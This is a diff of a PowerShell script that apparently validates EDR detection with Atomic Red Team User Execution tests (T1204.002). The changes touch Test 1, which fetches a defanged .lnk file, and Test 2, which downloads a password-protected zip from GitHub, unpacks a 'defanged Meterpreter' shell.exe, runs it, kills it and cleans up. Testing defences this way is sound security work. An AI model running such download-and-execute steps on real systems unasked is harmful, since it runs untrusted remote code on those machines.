@@ -169,10 +169,10 @@ function Run-AtomicTest1-Windows {
     "
     
     # First URL to download
-    $firstUrl = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
+    $T1204002Url = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/payloads/test10.lnk"
     
     # Second URL to download (provide your own URL)
-    $secondUrl = "YOUR_SECOND_URL_HERE"
+    $T1204002Url2 = "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/bin/test10.lnk"
 
     $confirmation = Read-Host "Do you want to proceed with T1204.002 : User Execution: Defanged malicious .lnk file? (Y/N)"
     if ($confirmation -ne "Y") {
@@ -184,25 +184,25 @@ function Run-AtomicTest1-Windows {
     try {
         # Try downloading the file from the first URL
         Log-Message "Run-AtomicTest1-Windows Downloading LNK file"
-        Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $firstUrl -ErrorAction Stop
-        Write-Host "File downloaded successfully from $firstUrl"
-        Log-Message "Run-AtomicTest1-Windows: Downloaded LNK file successfully from $firstUrl"
+        Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $T1204002Url -ErrorAction Stop
+        Write-Host "File downloaded successfully from $T1204002Url"
+        Log-Message "Run-AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url"
     }
     catch {
         # If an error occurs, display the error message
-        Write-Host "Error downloading file from $($firstUrl): $_"
+        Write-Host "Error downloading file from $($T1204002Url): $_"
         Write-Host "Trying second URL..."
-        Log-Message "Run-AtomicTest1-Windows: $firstUrl Unsuccessful Download"
+        Log-Message "Run-AtomicTest1-Windows: $T1204002Url Unsuccessful Download"
         
         try {
             # Try downloading the file from the second URL
-            Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $secondUrl -ErrorAction Stop
-            Write-Host "File downloaded successfully from $secondUrl"
-            Log-Message "Run-AtomicTest1-Windows: Downloaded LNK file successfully from $secondUrl"
+            Invoke-WebRequest -OutFile $tempDirectory\test10.lnk $T1204002Url2 -ErrorAction Stop
+            Write-Host "File downloaded successfully from $T1204002Url2"
+            Log-Message "Run-AtomicTest1-Windows: Downloaded LNK file successfully from $T1204002Url2"
         }
         catch {
             # If an error occurs again, display the error message and exit
-            Write-Host "Error downloading file from $($secondUrl): $_"
+            Write-Host "Error downloading file from $($T1204002Url2): $_"
             Write-Host "Failed to download the file from both URLs. Updating log information"
             Log-Message "Run-AtomicTest1-Windows: Unsuccessful Download from both URLs"
             return
@@ -233,6 +233,8 @@ function Run-AtomicTest1-Windows {
 
 function Run-AtomicTest2-Windows {
     Log-Message "Run-AtomicTest2-Windows: Starting"
+
+    # Write the test description
     Write-Host "
     Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter
     ------------------------------------
@@ -251,104 +253,90 @@ function Run-AtomicTest2-Windows {
     
     ------------------------------------
     Expected Outcome: EDR detects, alerts, and quarantines shell.exe without execution.
-    
     "
+
+    # Log the C2 server validation
     Write-Host "    Validating the C2 server is " -NoNewline
     Write-Host "non-operational" -ForegroundColor Green -NoNewline
     Write-Host " prior to execution: " -NoNewline
     Test-C2-Port
+    
     # First URL to download
-    $firstUrl = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/payloads/shell-trifident.zip"
+    $T12040022Url = "https://github.com/TRIFIDENT/ResponseValidation/raw/main/payloads/shell-trifident.zip"
     
     # Second URL to download (provide your own URL)
-    $secondUrl = "YOUR_SECOND_URL_HERE"
-
+    $T12040022Url2 = "YOUR_SECOND_URL_HERE"
+    # Log the user confirmation
     $confirmation = Read-Host "Do you want to proceed with Test 2: T1204.002 : User Execution: Defanged Malware: Meterpreter? (Y/N)"
+    Log-Message "User confirmation: $confirmation"
     if ($confirmation -ne "Y") {
-            Write-Host "Exiting script..."
-            return
-        }
-    
+        Write-Host "Exiting script..."
+        return
+    }
+
+    # Attempt to download the file from the first URL
     try {
-        # Try downloading the file from the first URL
-        Log-Message "Run-AtomicTest2-Windows: Downloading shell-trifident.zip"
-        Invoke-WebRequest -OutFile $tempDirectory\shell-trifident.zip $firstUrl -ErrorAction Stop
-        Write-Host "File downloaded successfully from $firstUrl"
-        Log-Message "Run-AtomicTest2-Windows: Downloaded shell-trifident.zip from $firstUrl"
+        Log-Message "Downloading shell-trifident.zip from first URL"
+        Invoke-WebRequest -OutFile "$tempDirectory\shell-trifident.zip" $T12040022Url -ErrorAction Stop
+        Log-Message "File downloaded successfully from $T12040022Url"
     }
     catch {
-        # If an error occurs, display the error message
-        Log-Message "Run-AtomicTest2-Windows: Downloading shell-trifident.zip"
-        Write-Host "Error downloading file from $($firstUrl): $_"
-        Write-Host "Trying second URL..."
-        Log-Message "Run-AtomicTest2-Windows: Error Downloading shell-trifident.zip from $firstUrl"
-        
+        # If the first attempt fails, try the second URL
+        Log-Message "Error downloading file from $T12040022Url"
+        Log-Message "Trying second URL"
         try {
-            # Try downloading the file from the second URL
-            Invoke-WebRequest -OutFile $tempDirectory\shell-trifident.zip $secondUrl -ErrorAction Stop
-            Write-Host "File downloaded successfully from $secondUrl"
-            Log-Message "Run-AtomicTest2-Windows: Downloaded shell-trifident.zip from $secondUrl"
+            Log-Message "Downloading shell-trifident.zip from second URL"
+            Invoke-WebRequest -OutFile "$tempDirectory\shell-trifident.zip" $T12040022Url2 -ErrorAction Stop
+            Log-Message "File downloaded successfully from $T12040022Url2"
         }
         catch {
-            # If an error occurs again, display the error message and exit
-            Write-Host "Error downloading file from $($secondUrl): $_"
-            Write-Host "Failed to download the file from both URLs. Updating log information"
-            Log-Message "Run-AtomicTest2-Windows: Error Downloading shell-trifident.zip"
-            #return
+            # If both attempts fail, log the error and exit
+            Log-Message "Error downloading file from $T12040022Url2"
+            Log-Message "Failed to download the file from both URLs"
+            return
         }
     }
 
-    # The zip file is password protected, we need 7zip to unpack it. If 7zip is not currently installed
-    # This script will remove it in the clean up section. (It will leave it if already installed)
-
-    # Check if 7Zip4Powershell module is installed
+    # Unzip the downloaded file
     if (-not (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
-        # If not installed, install the module
-        Log-Message "Run-AtomicTest2-Windows: 7Zip4Powershell module Not installed, installing"
+        Log-Message "7Zip4Powershell module Not installed, installing"
         Install-Module -Name 7Zip4Powershell -Force
-        $Installed7Zip = $true
-        Log-Message "Run-AtomicTest2-Windows: 7Zip4Powershell module installed"
+        Log-Message "7Zip4Powershell module installed"
     } else {
-        Write-Host "7Zip4Powershell module is already installed."
-        Log-Message "Run-AtomicTest2-Windows: 7Zip4Powershell module is already installed."
-        $Installed7Zip = $false
+        Log-Message "7Zip4Powershell module is already installed."
     }
 
-    # If the module was installed or already installed, proceed with unzipping the file
-    if ($Installed7Zip -or (Get-Module -Name 7Zip4Powershell -ListAvailable)) {
-        $zipFile = "$tempDirectory/shell-trifident.zip"
-        $destination = $tempDirectory
-        $password = "trifident"
-        
-        # Unzip the file using 7Zip4Powershell
-        Expand-7Zip -ArchiveFileName $zipFile -Password $password -TargetPath $destination
-        Log-Message "Run-AtomicTest2-Windows: shell-trifident.zip unpacked to $destination"
+    if ((Get-Module -Name 7Zip4Powershell -ListAvailable)) {
+        Log-Message "Unzipping shell-trifident.zip"
+        Expand-7Zip -ArchiveFileName "$tempDirectory\shell-trifident.zip" -Password "trifident" -TargetPath $tempDirectory
+        Log-Message "shell-trifident.zip unpacked to $tempDirectory"
     } else {
-        Write-Host "Unable to unzip the file because the 7Zip4Powershell module is not available."
-        Log-Message "Run-AtomicTest2-Windows: failed to unpack shell-trifident.zip $destination"
+        Log-Message "Unable to unzip the file because the 7Zip4Powershell module is not available."
+        return
     }
     
-    # The test file has been saved to $temp\shell.exe
-    $file1 = "$tempDirectory/shell.exe"
     # Execute the downloaded file
-    Log-Message "Run-AtomicTest2-Windows: Executing $file1"
-    Start-Process $file1
+    Log-Message "Executing $tempDirectory\shell.exe"
+    Start-Process "$tempDirectory\shell.exe"
 
     # Wait for 10 seconds
     Start-Sleep -Seconds 10
 
-    # Kill the process named "a.exe"
+    # Terminate the process
     taskkill /IM shell.exe /F
-    Log-Message "Run-AtomicTest2-Windows: Terminating $file1 process"
+    Log-Message "Terminated $tempDirectory\shell.exe process"
 
-    # Removing all downloaded or created files
-    Log-Message "Run-AtomicTest2-Windows: Removing all downloaded or created files"
-    $file1 = "$tempDirectory\shell-trifident.zip"
-    $file2 = "$tempDirectory\shell.exe"
-    Remove-Item $file1 -ErrorAction Ignore
-    Remove-Item $file2 -ErrorAction Ignore
+    # Clean up - remove downloaded files
+    Log-Message "Removing all downloaded or created files"
+    $filesToRemove = "$tempDirectory\shell-trifident.zip", "$tempDirectory\shell.exe"
+    foreach ($file in $filesToRemove) {
+        Remove-Item $file -ErrorAction Ignore
+        Log-Message "Removed $file"
+    }
 
+    Log-Message "Run-AtomicTest2-Windows: Completed"
 }
+
 
 Log-Message "Starting script execution..."
 # Call the function to display the logo and begin tests
